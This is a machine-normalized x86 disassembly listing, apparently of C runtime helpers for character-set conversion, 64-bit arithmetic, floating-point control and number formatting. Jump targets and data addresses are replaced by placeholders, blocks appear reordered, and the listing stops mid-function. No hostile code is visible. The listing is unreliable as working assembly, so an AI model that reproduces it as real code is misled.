mov eax 0x1
or eax 0xffffffff
jmp r-xdata
push edx
push eax
mov eax [ rw-data ]
push 0x1
push ebx
push 0x9
mov ecx [ eax ]
push ecx
call MultiByteToWideChar
test eax eax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ ebx + 0x1 ] 0x0
jne r-xdata
xor ecx ecx
mov ecx 0x1
jmp r-xdata
mov eax 0x2
jmp r-xdata
push ecx
push eax
mov eax [ rw-data ]
push 0x2
push ebx
push 0x9
mov edx [ eax ]
push edx
call MultiByteToWideChar
test eax eax
jne r-xdata
sub_4cc238
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx ] 0x0
jne r-xdata
test edi edi
jne r-xdata
test esi esi
je r-xdata
mov dl [ ebx ]
push edx
push edi
call IsDBCSLeadByteEx
test eax eax
je r-xdata
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov [ esi ] 0x0
test esi esi
je r-xdata
cmp [ ebp + 0x10 ] 0x2
jl r-xdata
mov eax 0x1
jmp r-xdata
xor edx edx
mov dl [ ebx ]
mov [ esi ] dx
xor edx edx
mov edx 0x1
jmp r-xdata
cmp [ ebp + 0x10 ] 0x2
jl r-xdata
test esi esi
je r-xdata
mov eax 0x1
or eax 0xffffffff
jmp r-xdata
push edx
push esi
push 0x1
push ebx
push 0x9
push edi
call MultiByteToWideChar
test eax eax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ ebx + 0x1 ] 0x0
jne r-xdata
xor ecx ecx
mov ecx 0x1
jmp r-xdata
mov eax 0x2
jmp r-xdata
push ecx
push esi
push 0x2
push ebx
push 0x9
push edi
call MultiByteToWideChar
test eax eax
jne r-xdata
sub_4cc2fc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x8 ] 0x0
je r-xdata
xor eax eax
pop ebp
retn
push 0x0
push 0x0
push 0x2
push eax
mov eax [ rw-data ]
lea ecx [ ebp + 0xc ]
push 0x1
push ecx
push 0x220
mov edx [ eax ]
push edx
call WideCharToMultiByte
test eax eax
jne r-xdata
movzx ecx [ ebp + 0xc ]
cmp ecx 0xff
jle r-xdata
pop ebp
retn
or eax 0xffffffff
pop ebp
retn
mov dl [ ebp + 0xc ]
mov [ eax ] dl
mov eax 0x1
pop ebp
retn
mov [ ebp + 0xc ] 0x3f
sub_4cc360
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x8 ] 0x0
je r-xdata
xor eax eax
pop ecx
pop ebp
retn
xor edx edx
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] edx
push ecx
push 0x0
push 0x2
push eax
lea eax [ ebp + 0xc ]
mov edx [ rw-data ]
push 0x1
push eax
push 0x220
mov ecx [ edx ]
push ecx
call WideCharToMultiByte
test eax eax
je r-xdata
movzx ecx [ ebp + 0xc ]
cmp ecx 0xff
jle r-xdata
or eax 0xffffffff
pop ecx
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ ebp + 0xc ]
mov [ eax ] dl
mov eax 0x1
pop ecx
pop ebp
retn
or eax 0xffffffff
pop ecx
pop ebp
retn
pop ecx
pop ebp
retn
sub_4cc3d8
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
test edx edx
jne r-xdata
xor eax eax
pop ecx
pop ebp
retn
xor ecx ecx
mov [ ebp - 0x4 ] ecx
lea ecx [ ebp - 0x4 ]
push ecx
push 0x0
push 0x2
push eax
push 0x1
lea eax [ ebp + 0xc ]
push eax
push 0x220
push edx
call WideCharToMultiByte
test eax eax
je r-xdata
movzx edx [ ebp + 0xc ]
cmp edx 0xff
jle r-xdata
or eax 0xffffffff
pop ecx
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ ebp + 0xc ]
mov [ eax ] dl
mov eax 0x1
pop ecx
pop ebp
retn
or eax 0xffffffff
pop ecx
pop ebp
retn
pop ecx
pop ebp
retn
sub_4cc444
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
xor ebx ebx
test esi esi
je r-xdata
test esi esi
je r-xdata
test edi edi
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x8 ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x8 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
push 0x0
push 0x0
push 0xffffffff
mov edx [ rw-data ]
mov eax [ ebp + 0xc ]
push eax
push 0x9
mov ecx [ edx ]
push ecx
call MultiByteToWideChar
mov ebx eax
test eax eax
jne r-xdata
mov ecx [ ebp + 0xc ]
push ecx
call sub_4c4e7c
pop ecx
jmp r-xdata
push edi
push esi
push 0xffffffff
mov ecx [ rw-data ]
mov edx [ ebp + 0xc ]
push edx
push 0x9
mov eax [ ecx ]
push eax
call MultiByteToWideChar
mov ebx eax
test eax eax
je r-xdata
mov ecx [ ebp + 0xc ]
cmp edi ebx
lea eax [ ecx + ebx ]
jbe r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
dec eax
or eax 0xffffffff
jmp r-xdata
call GetLastError
cmp eax 0x7a
je r-xdata
mov eax ebx
dec eax
jmp r-xdata
mov eax ebx
jmp r-xdata
xor edx edx
mov dl [ eax ]
mov [ esi ] dx
cmp [ eax ] 0x0
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
inc ebx
inc eax
add esi 0x2
cmp edi ebx
ja r-xdata
mov eax ebx
jmp r-xdata
mov ecx edx
add edx 0xffffffff
test ecx ecx
je r-xdata
sub eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push edi
push esi
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov edx [ ebp + 0xc ]
push edx
push 0x1
mov edx [ eax ]
push edx
call MultiByteToWideChar
mov ebx eax
test eax eax
jne r-xdata
cmp [ eax ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov cl [ eax ]
test [ ecx + rw-data ] 0x4
je r-xdata
inc eax
inc eax
sub_4cc57c
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
lea edx [ ecx + 0x1 ]
mov eax ebx
jmp r-xdata
dec edx
je r-xdata
test edx edx
je r-xdata
cmp [ eax ] 0x0
jne r-xdata
mov eax ecx
pop ebx
pop ebp
retn
cmp [ eax ] 0x0
jne r-xdata
add eax 0x2
sub eax ebx
sar eax 0x1
jns r-xdata
inc eax
pop ebx
pop ebp
retn
adc eax 0x0
sub_4cc5b8
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
push ebx
push esi
mov [ ebp - 0xc ] eax
xor ebx ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x8 ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x8 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0xc ]
mov ecx [ rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx [ ebp + 0xc ]
push edx
push 0x220
mov eax [ ecx ]
push eax
call WideCharToMultiByte
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ ebp + 0xc ]
push ecx
call sub_4c5124
pop ecx
jmp r-xdata
lea edx [ ebp - 0xc ]
push edx
push 0x0
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ rw-data ]
mov eax [ ebp + 0x8 ]
push eax
push 0xffffffff
mov edx [ ebp + 0xc ]
push edx
push 0x220
mov eax [ ecx ]
push eax
call WideCharToMultiByte
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ebx [ ebp + 0x10 ]
lea eax [ ecx + ebx ]
jae r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
or eax 0xffffffff
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
movzx ecx [ edx ]
cmp ecx 0xff
jle r-xdata
mov eax ebx
dec eax
or eax 0xffffffff
jmp r-xdata
call GetLastError
cmp eax 0x7a
je r-xdata
mov eax ebx
dec eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov cl [ edx ]
mov [ eax ] cl
mov edx [ ebp + 0xc ]
add [ ebp + 0xc ] 0x2
cmp [ edx ] 0x0
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp ebx [ ebp + 0x10 ]
jae r-xdata
inc ebx
inc eax
cmp ebx [ ebp + 0x10 ]
jb r-xdata
mov eax ebx
jmp r-xdata
mov eax ebx
jmp r-xdata
lea edx [ ebp - 0xc ]
lea ecx [ ebp - 0x6 ]
push edx
push 0x0
push 0x2
push ecx
push 0x1
mov edx [ rw-data ]
mov eax [ ebp + 0xc ]
push eax
push 0x0
mov ecx [ edx ]
push ecx
call WideCharToMultiByte
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
add edx ebx
cmp edx [ ebp + 0x10 ]
jbe r-xdata
xor esi esi
mov eax [ ebp + 0x8 ]
lea edx [ eax + ebx ]
lea eax [ ebp - 0x6 ]
cmp esi [ ebp - 0x4 ]
jge r-xdata
mov eax ebx
jmp r-xdata
add [ ebp + 0xc ] 0x2
cmp ebx [ ebp + 0x10 ]
jb r-xdata
mov cl [ eax ]
mov [ edx ] cl
test cl cl
jne r-xdata
inc eax
inc esi
inc edx
inc ebx
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax ebx
jmp r-xdata
sub_4cc76c
push ebp
mov ebp esp
push ebx
call sub_4caa74
mov eax [ ebp + 0xc ]
push eax
mov dx [ ebp + 0x8 ]
push edx
call sub_4ca570
add esp 0x8
mov ebx eax
call sub_4caa80
mov eax ebx
pop ebx
pop ebp
retn
sub_4cc794
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xffffffff
jne r-xdata
xor edx edx
mov dl al
test [ edx * 2 + rw-data ] 0x1
je r-xdata
or eax 0xffffffff
pop ebp
retn
mov eax edx
pop ebp
retn
add edx 0x20
mov eax edx
pop ebp
retn
sub_4cc7c0
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_4cc7e3
push ebp
push ebx
push esi
push edi
xor edi edi
mov ebx [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
or ecx ecx
jne r-xdata
or edx edx
jns r-xdata
or edx edx
je r-xdata
or ecx ecx
jns r-xdata
neg edx
neg eax
sbb edx 0x0
or edi 0x1
div ebx
xor edx edx
jmp r-xdata
or ebx ebx
je r-xdata
mov ebp ecx
mov ecx 0x40
push edi
xor edi edi
xor esi esi
neg ecx
neg ebx
sbb ecx 0x0
xor edi 0x1
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
loop r-xdata
ja r-xdata
shl eax 0x1
rcl edx 0x1
rcl esi 0x1
rcl edi 0x1
cmp edi ebp
jb r-xdata
pop ebx
test ebx 0x1
je r-xdata
sub esi ebx
sbb edi ebp
inc eax
cmp esi ebx
jb r-xdata
neg edx
neg eax
sbb edx 0x0
sub_4cc85b
push ebp
push ebx
push esi
push edi
mov ebx [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
or ecx ecx
jne r-xdata
mov ebp ecx
mov ecx 0x40
xor edi edi
xor esi esi
or edx edx
je r-xdata
loop r-xdata
ja r-xdata
div ebx
xor edx edx
jmp r-xdata
or ebx ebx
je r-xdata
shl eax 0x1
rcl edx 0x1
rcl esi 0x1
rcl edi 0x1
cmp edi ebp
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub esi ebx
sbb edi ebp
inc eax
cmp esi ebx
jb r-xdata
sub_4cc8a4
push ebp
push ebx
push esi
push edi
xor edi edi
mov ebx [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
or ecx ecx
jne r-xdata
or edx edx
jns r-xdata
or edx edx
je r-xdata
or ecx ecx
jns r-xdata
neg edx
neg eax
sbb edx 0x0
or edi 0x1
div ebx
xchg edx eax
xor edx edx
jmp r-xdata
or ebx ebx
je r-xdata
mov ebp ecx
mov ecx 0x40
push edi
xor edi edi
xor esi esi
neg ecx
neg ebx
sbb ecx 0x0
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
loop r-xdata
ja r-xdata
shl eax 0x1
rcl edx 0x1
rcl esi 0x1
rcl edi 0x1
cmp edi ebp
jb r-xdata
mov eax esi
mov edx edi
pop ebx
test ebx 0x1
je r-xdata
sub esi ebx
sbb edi ebp
inc eax
cmp esi ebx
jb r-xdata
neg edx
neg eax
sbb edx 0x0
sub_4cc91e
push ebp
push ebx
push esi
push edi
mov ebx [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
or ecx ecx
jne r-xdata
mov ebp ecx
mov ecx 0x40
xor edi edi
xor esi esi
or edx edx
je r-xdata
loop r-xdata
ja r-xdata
div ebx
xchg edx eax
xor edx edx
jmp r-xdata
or ebx ebx
je r-xdata
shl eax 0x1
rcl edx 0x1
rcl esi 0x1
rcl edi 0x1
cmp edi ebp
jb r-xdata
mov eax esi
mov edx edi
sub esi ebx
sbb edi ebp
inc eax
cmp esi ebx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4cc96c
cmp cl 0x20
jl r-xdata
shld edx eax cl
shl eax cl
retn
cmp cl 0x40
jl r-xdata
mov edx eax
shl edx cl
xor eax eax
retn
xor edx edx
xor eax eax
retn
sub_4cc988
cmp cl 0x20
jl r-xdata
shrd eax edx cl
sar edx cl
retn
cmp cl 0x40
jl r-xdata
mov eax edx
cdq
sar eax cl
retn
sar edx 0x1f
mov eax edx
retn
sub_4cc9a4
cmp cl 0x20
jl r-xdata
shrd eax edx cl
shr edx cl
retn
cmp cl 0x40
jl r-xdata
mov eax edx
xor edx edx
shr eax cl
retn
xor edx edx
xor eax eax
retn
sub_4cc9c8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov edx [ ebp + 0x8 ]
cmp edx 0xffffecbc
jge r-xdata
cmp edx 0x1344
jle r-xdata
fld [ r-xdata ]
jmp r-xdata
test edx edx
jne r-xdata
mov eax rw-data
fld [ eax ]
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax edx
test edx edx
jge r-xdata
fld [ r-xdata ]
jmp r-xdata
mov ecx eax
and ecx 0x7
sar eax 0x3
test al 0x1
lea ecx [ ecx + ecx * 4 ]
mov ebx [ ecx * 2 + rw-data ]
mov [ ebp - 0xc ] ebx
mov ebx [ ecx * 2 + rw-data ]
mov [ ebp - 0x8 ] ebx
mov bx [ ecx * 2 + rw-data ]
mov [ ebp - 0x4 ] bx
je r-xdata
mov eax edx
neg eax
sar eax 0x1
test eax eax
je r-xdata
fld [ rw-data ]
fld [ ebp - 0xc ]
fmulp st1
fstp [ ebp - 0xc ]
fwait
test edx edx
jge r-xdata
test al 0x1
je r-xdata
fld [ ebp - 0xc ]
fld [ ebp - 0xc ]
fdivr [ r-xdata ]
jmp r-xdata
sar eax 0x1
test al 0x1
je r-xdata
fld [ rw-data ]
fld [ ebp - 0xc ]
fmulp st1
fstp [ ebp - 0xc ]
fwait
sar eax 0x1
test al 0x1
je r-xdata
mov ecx rw-data
fld [ ecx ]
fld [ ebp - 0xc ]
fmulp st1
fstp [ ebp - 0xc ]
fwait
sar eax 0x1
test al 0x1
je r-xdata
mov ecx rw-data
fld [ ecx ]
fld [ ebp - 0xc ]
fmulp st1
fstp [ ebp - 0xc ]
fwait
sar eax 0x1
test al 0x1
je r-xdata
mov ecx rw-data
fld [ ecx ]
fld [ ebp - 0xc ]
fmulp st1
fstp [ ebp - 0xc ]
fwait
sar eax 0x1
test al 0x1
je r-xdata
mov ecx rw-data
fld [ ecx ]
fld [ ebp - 0xc ]
fmulp st1
fstp [ ebp - 0xc ]
fwait
sar eax 0x1
test al 0x1
je r-xdata
mov ecx rw-data
fld [ ecx ]
fld [ ebp - 0xc ]
fmulp st1
fstp [ ebp - 0xc ]
fwait
sar eax 0x1
test al 0x1
je r-xdata
mov ecx rw-data
fld [ ecx ]
fld [ ebp - 0xc ]
fmulp st1
fstp [ ebp - 0xc ]
fwait
sar eax 0x1
test al 0x1
je r-xdata
mov ecx rw-data
fld [ ecx ]
fld [ ebp - 0xc ]
fmulp st1
fstp [ ebp - 0xc ]
fwait
mov eax rw-data
fld [ eax ]
fld [ ebp - 0xc ]
fmulp st1
fstp [ ebp - 0xc ]
fwait
sub_4ccb50
push ebp
mov ebp esp
push ebx
push esi
push edi
xor edi edi
mov esi [ ebp + 0x8 ]
mov bl [ esi ]
inc esi
movsx eax bl
push eax
call sub_4ce904
pop ecx
test eax eax
jne r-xdata
cmp bl 0x2b
je r-xdata
cmp bl 0x2d
mov bl [ esi ]
sete al
and eax 0x1
inc esi
jmp r-xdata
cmp bl 0x2d
jne r-xdata
cmp bl 0x30
jl r-xdata
xor eax eax
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x39
jle r-xdata
mov eax edi
mov eax edi
neg eax
jmp r-xdata
movsx ecx bl
mov edx edi
mov bl [ esi ]
add edx edx
lea edx [ edx + edx * 4 ]
add edx ecx
add edx 0xffffffd0
inc esi
mov edi edx
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4ccbdc
push ebp
mov ebp esp
lea esp [ ebp - 0x4 ]
fwait
fnstcw [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
jecxz r-xdata
and eax ecx
not ecx
fwait
movzx edx [ ebp - 0x4 ]
and edx ecx
or eax edx
mov [ ebp - 0x4 ] ax
fldcw [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
mov [ rw-data ] eax
sub_4ccca0
push ebp
mov ebp esp
lea esp [ ebp - 0xc ]
fwait
fnstcw [ ebp - 0x4 ]
fwait
mov ax [ ebp - 0x4 ]
or [ ebp - 0x4 ] 0xc01
fldcw [ ebp - 0x4 ]
fistp [ ebp - 0xc ]
mov [ ebp - 0x4 ] ax
fwait
fnclex
fldcw [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_4cccd0
push ebp
mov ebp esp
lea esp [ ebp - 0xa ]
mov eax [ ebp + 0x8 ]
test [ eax + 0x7 ] 0x80
jne r-xdata
mov ecx [ eax ]
mov [ ebp - 0xa ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x6 ] ecx
mov [ ebp - 0x2 ] 0x403e
fld [ ebp - 0xa ]
mov esp ebp
pop ebp
retn
fild [ eax ]
mov esp ebp
pop ebp
retn
sub_4ccd00
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
cmp [ edx + 0x8 ] 0x403e
je r-xdata
mov ecx [ edx ]
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
retn
fld [ edx ]
fistp [ eax ]
fwait
retn
sub_4ccd38
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov esi [ ebp + 0x10 ]
cmp edi 0x2
jl r-xdata
mov [ esi ] 0x0
mov eax [ ebp + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp edi 0x24
jg r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jge r-xdata
cmp [ ebp + 0x8 ] 0x0
jae r-xdata
lea ebx [ ebp - 0x44 ]
cmp [ ebp + 0x18 ] 0x0
je r-xdata
jmp r-xdata
mov eax edi
cdq
push edx
push eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
call sub_4cc91e
mov [ ebx ] al
mov eax edi
cdq
push edx
push eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
inc ebx
call sub_4cc85b
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
cmp edx 0x0
jne r-xdata
cmp eax 0x0
je r-xdata
mov [ esi ] 0x2d
inc esi
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
neg eax
adc edx 0x0
mov [ ebp + 0x8 ] eax
neg edx
mov [ ebp + 0xc ] edx
lea edx [ ebp - 0x44 ]
cmp ebx edx
jne r-xdata
jmp r-xdata
dec ebx
mov al [ ebx ]
cmp al 0xa
jge r-xdata
add al [ ebp + 0x1c ]
add al 0xf6
mov [ esi ] al
inc esi
add eax 0x30
mov [ esi ] al
inc esi
jmp r-xdata
sub_4ccdec
push ebp
mov ebp esp
add esp 0xffffff7c
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov esi [ ebp + 0x10 ]
cmp edi 0x2
jl r-xdata
mov [ esi ] 0x0
mov eax [ ebp + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp edi 0x24
jg r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jge r-xdata
cmp [ ebp + 0x8 ] 0x0
jae r-xdata
lea ebx [ ebp - 0x84 ]
cmp [ ebp + 0x18 ] 0x0
je r-xdata
jmp r-xdata
mov eax edi
cdq
push edx
push eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
call sub_4cc91e
movsx edx al
mov [ ebx ] dx
mov eax edi
cdq
push edx
push eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
add ebx 0x2
call sub_4cc85b
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
cmp edx 0x0
jne r-xdata
cmp eax 0x0
je r-xdata
mov [ esi ] 0x2d
add esi 0x2
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
neg eax
adc edx 0x0
mov [ ebp + 0x8 ] eax
neg edx
mov [ ebp + 0xc ] edx
lea edx [ ebp - 0x84 ]
cmp ebx edx
jne r-xdata
jmp r-xdata
sub ebx 0x2
mov ax [ ebx ]
movzx ecx ax
cmp ecx 0xa
jge r-xdata
add ax [ ebp + 0x1c ]
add ax 0xfff6
mov [ esi ] ax
add esi 0x2
add eax 0x30
mov [ esi ] ax
add esi 0x2
jmp r-xdata
sub_4ccec4
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov cx 0x43fe
mov bx 0x3bcd
mov cx 0x407e
mov bx 0x3f6a
jmp r-xdata
cmp cx dx
jae r-xdata
fld [ ebp + 0xc ]
fstp [ ebp - 0x1c ]
fwait
fld [ ebp - 0x1c ]
jmp r-xdata
lea eax [ ebp + 0xc ]
mov dx [ eax + 0x8 ]
mov edi edx
and di 0x8000
mov [ ebp - 0x6 ] di
and dx 0x7fff
movzx edi dx
cmp edi 0x7fff
jne r-xdata
cmp cx dx
jne r-xdata
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx edx
or cx [ eax ]
or cx [ eax + 0x2 ]
or cx [ eax + 0x4 ]
or cx [ eax + 0x6 ]
jne r-xdata
push 0x0
push 0x0
call sub_4ccbdc
add esp 0x8
mov [ ebp - 0x4 ] eax
push 0xc00
push 0xc00
call sub_4ccbdc
add esp 0x8
test esi esi
jne r-xdata
call sub_4ceadc
mov [ eax ] 0x22
cmp [ ebp - 0x6 ] 0x0
je r-xdata
cmp bx dx
jbe r-xdata
fld [ ebp + 0xc ]
fstp [ ebp - 0x24 ]
fwait
fld [ ebp - 0x24 ]
jmp r-xdata
fld [ ebp + 0xc ]
fstp [ ebp - 0x10 ]
fwait
fld [ ebp + 0xc ]
fstp [ ebp - 0x14 ]
fwait
fld [ ebp - 0x14 ]
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
fld [ ebp - 0x10 ]
jmp r-xdata
fld [ ebp - 0x10 ]
fchs
jmp r-xdata
fld [ ebp + 0xc ]
fstp [ ebp - 0x2c ]
fwait
fld [ ebp - 0x2c ]
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
push 0xc00
mov edx [ ebp - 0x4 ]
push edx
call sub_4ccbdc
fld [ ebp - 0x10 ]
add esp 0x8
jmp r-xdata
sub_4ccfe0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
cmp edi 0x2
jl r-xdata
mov [ ebx ] 0x0
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp edi 0x24
jg r-xdata
test esi esi
jge r-xdata
lea ecx [ ebp - 0x24 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x24 ]
cmp ecx edx
jne r-xdata
jmp r-xdata
mov [ ebx ] 0x2d
inc ebx
neg esi
dec ecx
mov al [ ecx ]
cmp al 0xa
jge r-xdata
mov eax esi
xor edx edx
div edi
mov [ ecx ] dl
inc ecx
mov eax esi
xor edx edx
div edi
mov esi eax
test eax eax
je r-xdata
add al [ ebp + 0x18 ]
add al 0xf6
mov [ ebx ] al
inc ebx
add eax 0x30
mov [ ebx ] al
inc ebx
jmp r-xdata
sub_4cd054
push ebp
mov ebp esp
push 0x61
push 0x0
push 0xa
mov eax [ ebp + 0xc ]
push eax
mov edx [ ebp + 0x8 ]
push edx
call sub_4ccfe0
add esp 0x14
pop ebp
retn
sub_4cd070
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
cmp eax 0xa
push 0x61
sete cl
and ecx 0x1
cmp eax 0xa
push ecx
push eax
mov ecx [ ebp + 0xc ]
push ecx
jne r-xdata
mov eax edx
mov eax edx
jmp r-xdata
push eax
call sub_4ccfe0
add esp 0x14
pop ebp
retn
sub_4cd0a0
push ebp
mov ebp esp
push 0x61
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov edx [ ebp + 0xc ]
push edx
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4ccfe0
add esp 0x14
pop ebp
retn
sub_4cd0c0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push 0x61
cmp eax 0xa
sete dl
and edx 0x1
push edx
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4ccfe0
add esp 0x14
pop ebp
retn
sub_4cd0e8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x4
jne r-xdata
cmp [ eax ] 0x5
jne r-xdata
xor edx edx
mov [ eax + 0x18 ] edx
mov [ eax + 0x1c ] edx
mov eax 0x1
pop ebp
retn
xor eax eax
pop ebp
retn
mov eax 0x1
pop ebp
retn
sub_4cd114
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x4
jne r-xdata
cmp [ eax ] 0x5
jne r-xdata
xor edx edx
mov [ eax + 0x1c ] edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x24 ] dx
mov eax 0x1
pop ebp
retn
xor eax eax
pop ebp
retn
mov eax 0x1
pop ebp
retn
sub_4cd160
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov ecx 0xa
mov eax [ esi + 0x4 ]
xor edx edx
or eax eax
je r-xdata
mov eax [ esi ]
div ecx
mov [ esi ] eax
mov eax edx
pop esi
pop ebp
retn
div ecx
mov [ esi + 0x4 ] eax
sub_4cd188
push ebp
mov ebp esp
push esi
push edi
mov esi [ ebp + 0x8 ]
mov ecx 0xa
mov eax [ esi ]
mul ecx
add eax [ ebp + 0xc ]
adc edx 0x0
mov [ esi ] eax
mov edi edx
mov eax [ esi + 0x4 ]
mul ecx
add eax edi
adc edx 0x0
mov [ esi + 0x4 ] eax
mov eax edx
pop edi
pop esi
pop ebp
retn
sub_4cd1b8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
push 0xe
call sub_4ca1c0
pop ecx
cmp bl 0x47
je r-xdata
cmp [ edi - 0x1 ] 0x30
je r-xdata
cmp bl 0x67
jne r-xdata
dec edi
cmp esi edi
jb r-xdata
mov dl [ eax ]
cmp dl [ edi - 0x1 ]
jne r-xdata
jmp r-xdata
mov eax esi
jmp r-xdata
mov eax edi
dec edi
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4cd1fc
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
